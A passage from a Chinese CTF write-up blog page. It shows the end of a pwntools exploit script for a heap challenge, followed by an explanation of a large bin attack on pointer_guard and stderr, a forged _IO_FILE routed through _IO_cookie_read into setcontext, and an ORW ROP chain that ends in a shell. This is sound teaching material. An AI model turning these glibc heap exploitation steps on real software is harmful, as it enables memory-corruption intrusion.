class="number">7</span>)</span><br><span class="line">add_cat(<span class="number">14</span>, <span class="number">0x460</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">delete_cat(<span class="number">9</span>)</span><br><span class="line">delete_cat(<span class="number">12</span>)</span><br><span class="line">delete_cat(<span class="number">14</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># delete_cat(11)</span></span><br><span class="line">edit_cat(<span class="number">7</span>, p64(base + <span class="number">0x21A0E0</span>) * <span class="number">2</span> + p64(<span class="number">0</span>) + p64(base + libc.symbols[<span class="string">&#x27;stderr&#x27;</span>] - <span class="number">0x20</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x201</span>))</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;mew mew mew~~~~~~&#x27;</span>, <span class="string">b&#x27;CAT | r00t QWB QWXF\xFF$&#x27;</span>)  <span class="comment"># enter the menu</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;plz input your cat choice:\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;plz input your cat idx:\n&#x27;</span>, <span class="string">b&#x27;15&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># time.sleep(1)</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;plz input your cat size:\n&#x27;</span>, <span class="string">b&#x27;1129&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>前面的交互就不用说了，首先是释放chunk 1和4获取到libc和heap地址，并顺便使用0x400~0x430的large bin的large bin attack修改<code>tcbhead_t</code>结构体中的<code>pointer_guard</code>。<code>pcop</code>变量就是前面提到的pcop地址，<code>encrypted_addr</code>就是处理后的地址，经过<code>_IO_cookie_read</code>函数处理后能够变成<code>pcop</code>地址。</p>
<p>在payload中首先是<code>_IO_FILE</code>结构体，可以使用<code>pwntools</code>自带的<code>FileStructure</code>类进行声明，如果需要将其转为字节可使用<code>bytes()</code>函数进行处理。这里需要注意我们舍去了<code>_IO_FILE</code>的前0x10字节，因为large bin attack只能够将chunk地址写到<code>stderr</code>中，在可写头前面还有<code>prev_size</code>和<code>size</code>字段，为了保证对齐，需要舍弃<code>_IO_FILE</code>结构体的前0x10字节。</p>
<p>在<code>_IO_FILE</code>结构体后加上这个地方的堆地址和处理后的pcop地址，能够保证<code>_IO_cookie_read</code>函数能够跳转到pcop中。以0x100对齐后加上<code>setcontext</code>函数地址使得pcop能够调用到<code>setcontext</code>函数。</p>
<p>在<code>setcontext</code>后面紧跟<code>SigReturnFrame</code>结构体，这个结构体本来是用作系统调用<code>sysreturn</code>的，这里使用是因为其中<code>rsp</code>和<code>rip</code>的值正好能够对应上<code>setcontext</code>函数中的相关指令，能够通过修改<code>SigReturnFrame</code>结构体使得<code>setcontext</code>将<code>rsp</code>修改为我们想要栈迁移的地址，<code>rip</code>修改为我们想要跳转到的地址。注意这里的<code>SigReturnFrame</code>结构体舍弃了前面的0x28字节，原因与<code>_IO_FILE</code>舍弃前0x10字节类似，都是为了对齐。</p>
<p>在此之后就是ROP链，将<code>rsp</code>设置到这里，待<code>setcontext</code>返回后即可在这里继续执行，后面就是常规的orw。</p>
<p><img src="https://img-blog.csdnimg.cn/81cfd60bfff549048f32a9b4f50ef1ba.png"><br>成功getshell。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>理解本题的关键在于理解函数调用链：<br><code>calloc-&gt;_int_malloc-&gt;sysmalloc-&gt;__malloc_assert-&gt;__fxprintf-&gt;...-&gt;_IO_cookie_read-&gt;pcop-&gt;setcontext-&gt;ROP</code></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/7/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><span class="page-number current">8</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/9/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">CoLin</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">81</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">CoLin</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
